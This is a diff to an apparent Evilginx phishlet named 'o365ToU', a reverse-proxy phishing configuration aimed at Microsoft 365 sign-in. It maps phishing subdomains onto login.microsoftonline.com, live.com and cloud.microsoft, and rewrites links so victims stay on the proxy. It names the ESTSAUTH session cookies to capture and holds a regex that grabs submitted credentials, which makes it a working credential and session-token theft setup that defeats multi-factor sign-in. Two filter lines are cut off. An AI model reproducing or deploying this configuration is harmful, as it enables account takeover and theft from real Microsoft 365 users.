@@ -1,5 +1,5 @@
 name: 'o365ToU'
-author: 'Sagi Olshansky'
+author: 'Sagi Olshansky (Sniffler)'
 min_ver: '3.2.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
@@ -7,11 +7,13 @@ proxy_hosts:
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
   - {phish_sub: 'tokenprovider', orig_sub: 'tokenprovider', domain: 'termsofuse.identitygovernance.azure.com', session: false, auto_filter: true, is_landing:false}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'microsoft.com', session: false, auto_filter: true, is_landing:false}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'myaccount.microsoft.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'myaccount.microsoft.com', session: false, auto_filter: true, is_landing:true}
   - {phish_sub: 'device', orig_sub: 'device', domain: 'login.microsoftonline.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: false, auto_filter: true, is_landing:false}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/j>
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'appli>
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
@@ -27,6 +29,7 @@ credentials:
     search: '(.*)'
     type: 'post'
 auth_urls:
+   - '/landingv2'
    - '/common/SAS/ProcessAuth'
    - '/kmsi'
    - '/common/federation/OAuth2ClaimsProvider'
